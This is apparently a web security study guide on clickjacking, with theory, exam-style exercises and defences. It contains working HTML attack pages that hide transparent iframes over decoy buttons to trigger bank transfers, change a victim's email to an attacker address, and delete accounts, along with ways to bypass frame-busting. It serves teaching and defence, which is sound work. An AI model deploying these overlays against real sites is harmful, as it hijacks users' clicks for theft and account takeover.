# Theory

Clickjacking (also called UI Redress Attack) is a vulnerability where an attacker tricks a user into clicking on something different from what they perceive. The attacker overlays a transparent or opaque `<iframe>` of a legitimate website on top of a decoy page, so the victim's clicks are unknowingly sent to the legitimate site — performing actions without their consent.

## Key Aspects

	Victim is tricked into clicking invisible UI elements of a legitimate site
	Exploits the browser's ability to embed cross-origin pages in iframes
	Types: Basic Clickjacking & Multi-Step Clickjacking

# Scenarios
## Basic Clickjacking

A banking application allows users to transfer funds via a button at a predictable URL:

URL:
`https://bank.test/transfer-confirm`

The "Confirm Transfer" button appears at a fixed position on the page. The page does not set `X-Frame-Options` or a restrictive `Content-Security-Policy: frame-ancestors` header, so it can be embedded in an iframe on any domain.

### a. Predict the Backend Behaviour

When the "Confirm Transfer" button is clicked by an authenticated user, the server reads the session cookie and processes the transfer:

```sql
UPDATE accounts SET balance = balance - <amount> WHERE user = <session_user>;
UPDATE accounts SET balance = balance + <amount> WHERE user = 'attacker';
```

No CSRF token is required — the server trusts the authenticated session alone.

### b. Modify the request to craft a Basic Clickjacking attack

The attacker creates a decoy page on `evil.com` that:
1. Loads `bank.test/transfer-confirm` in a **transparent iframe** positioned over a fake button.
2. Positions the iframe so the real "Confirm Transfer" button overlaps the fake "Claim Prize" button.

```html
<!DOCTYPE html>
<html>
<head>
  <style>
    #decoy-button {
      position: absolute;
      top: 340px;
      left: 60px;
      z-index: 1;
    }
    #victim-frame {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0.0;       /* completely transparent — victim cannot see it */
      z-index: 2;
    }
  </style>
</head>
<body>
  <button id="decoy-button">🎉 Claim Your Prize!</button>
  <iframe id="victim-frame" src="https://bank.test/transfer-confirm"></iframe>
</body>
</html>
```

- The victim sees only the "Claim Your Prize!" button.
- The real "Confirm Transfer" button from `bank.test` sits invisibly on top.
- When the victim clicks "Claim Your Prize!", their click lands on "Confirm Transfer" → transfer executes with their session cookie.

### c. Conditions required for Basic Clickjacking

1. The target site must **allow itself to be framed** — no `X-Frame-Options: DENY/SAMEORIGIN` and no `Content-Security-Policy: frame-ancestors 'none'`.
2. The victim must be **authenticated** on the target site (session cookie present).
3. The target action must be completable with a **single click** (no CSRF token, no re-authentication).
4. The attacker must be able to **predict the exact position** of the target button on the page (fixed layout).
5. The victim must be **lured to the attacker's page** while their session is active.

> Clickjacking bypasses CSRF tokens because the actual legitimate page is loaded inside the iframe — the browser sends the real form submission with the real CSRF token. It is the user's click that is hijacked, not the request itself.

### d. Craft a payload to silently change the victim's email address

Assume `https://bank.test/settings` has an "Update Email" button at a known position:

```html
<style>
  #decoy { position: absolute; top: 410px; left: 80px; z-index: 1; }
  #frame {
    position: absolute; top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.0; z-index: 2;
  }
</style>
<button id="decoy">Click here to continue</button>
<iframe id="frame" src="https://bank.test/settings?prefill_email=attacker@evil.com"></iframe>
```

- If `bank.test` allows prefilling the email field via URL parameters and the user just clicks "Save", the email is changed to `attacker@evil.com`.
- Attacker then triggers a password reset to full account takeover.

### e. State the defences against Clickjacking and explain how they break the attack

| Defence | How it works | How it breaks Clickjacking |
|---|---|---|
| **`X-Frame-Options: DENY`** | HTTP response header that instructs browsers to never render the page in an iframe | Browser refuses to load `bank.test` inside the attacker's iframe — the overlay fails |
| **`X-Frame-Options: SAMEORIGIN`** | Only allows the page to be framed by the same origin | Cross-origin `evil.com` cannot embed `bank.test` — attack fails |
| **`Content-Security-Policy: frame-ancestors 'none'`** | Modern CSP directive that supersedes `X-Frame-Options` | Browser enforces the policy — framing from any origin is blocked |
| **Frame-busting JavaScript** | Script detects if the page is inside an iframe and redirects to top | `if (top !== self) { top.location = self.location; }` — breaks the iframe overlay |
| **User Interaction Verification** | Sensitive actions require typed confirmation (not just a click) | A typed password or CAPTCHA cannot be clickjacked |

---

## Multi-Step Clickjacking

The banking site is updated: transferring funds now requires **two clicks** — "Next" on a confirmation page, then "Confirm" on a review page.

URL sequence:
1. `https://bank.test/transfer-step1` → click "Next"
2. `https://bank.test/transfer-step2` → click "Confirm Transfer"

### a. Predict the Backend Behaviour

The server sets a short-lived session flag after step 1 is completed. Step 2 only processes the transfer if the flag is present — meaning both clicks must originate from an authenticated session.

### b. Craft a Multi-Step Clickjacking attack

The attacker designs the decoy page to guide the victim through **two clicks** at carefully calculated positions:

```html
<style>
  .decoy { position: absolute; z-index: 1; font-size: 18px; }
  #step1-frame, #step2-frame {
    position: absolute; top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.0; z-index: 2;
    border: none;
  }
</style>

<!-- Step 1: victim clicks "Win a Voucher" → lands on bank.test "Next" button -->
<div class="decoy" style="top:300px; left:100px;" id="step1-decoy">Win a Voucher!</div>
<iframe id="step1-frame" src="https://bank.test/transfer-step1"></iframe>

<!-- After first click, JavaScript switches to step 2 iframe -->
<script>
  document.getElementById('step1-frame').addEventListener('load', function() {
    setTimeout(function() {
      document.getElementById('step1-frame').style.display = 'none';
      document.getElementById('step2-frame').style.display = 'block';
      document.getElementById('step1-decoy').innerText = 'Confirm to claim!';
    }, 500);
  });
</script>
<iframe id="step2-frame" src="https://bank.test/transfer-step2" style="display:none;"></iframe>
```

- First click → victim clicks "Win a Voucher" → lands on step-1's "Next" button.
- Page switches to step-2 iframe.
- Second click → victim clicks "Confirm to claim" → lands on step-2's "Confirm Transfer" button.
- Transfer completes.

### c. Conditions required for Multi-Step Clickjacking

1. Same as Basic Clickjacking, plus the attacker must be able to **predict button positions across multiple pages**.
2. The multi-step flow must be completable entirely via **sequential clicks** with no unpredictable input (e.g., typed CAPTCHA or OTP).
3. The **iframe must load each step silently** — the victim must not notice page changes in the hidden frame.

### d. Craft a payload to silently complete a two-step account deletion

Assume:
- Step 1: `https://bank.test/delete-account-step1` → "Proceed" button at `(top: 350px, left: 120px)`
- Step 2: `https://bank.test/delete-account-step2` → "Confirm Delete" button at `(top: 350px, left: 120px)`

The attacker positions both decoy buttons at `(top: 350px, left: 120px)` and swaps the iframe after the first click — the victim unknowingly completes both steps, deleting their account.

### e. Explain why frame-busting JavaScript is an unreliable defence

Frame-busting scripts (`if (top !== self) top.location = self.location`) can be defeated by:

| Bypass Technique | Explanation |
|---|---|
| **`sandbox` attribute on iframe** | `<iframe sandbox="allow-forms allow-scripts" ...>` — `allow-top-navigation` is omitted, so `top.location` assignment is blocked by the browser, silently failing |
| **JavaScript disabled** | If the victim has JS disabled, frame-busting scripts do not execute |
| **`onbeforeunload` override** | Attacker's page overrides `window.onbeforeunload` to cancel navigation away |

This is why **HTTP headers (`X-Frame-Options`, `CSP frame-ancestors`)** are the only reliable defences.

---

# Exam-Style Questions

## Question 1 — SocialHub.com

A social networking site **SocialHub.com** has a "Delete Account" button on the user settings page at `https://socialhub.com/settings`. The page does not set any framing-protection headers. A user is logged in.

### (a) Identify the vulnerability and construct an attack

The page lacks `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` → **vulnerable to Clickjacking**.

**Attack page on `evil.com`:**

```html
<style>
  #lure { position: absolute; top: 390px; left: 75px; z-index: 1; }
  #frame {
    position: absolute; top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.0; z-index: 2;
  }
</style>
<div id="lure">Click here to see your profile stats!</div>
<iframe id="frame" src="https://socialhub.com/settings"></iframe>
```

- When the victim clicks "Click here to see your profile stats!", the click lands on the invisible "Delete Account" button → account is deleted.

### (b) Recommend the most effective fix

Add the following HTTP response header to all pages on `socialhub.com`:

```
Content-Security-Policy: frame-ancestors 'none'
```

Or equivalently (for older browser compatibility):

```
X-Frame-Options: DENY
```

This instructs the browser to refuse to render `socialhub.com` inside any iframe on any origin — breaking the attack at the browser level before any user interaction occurs.
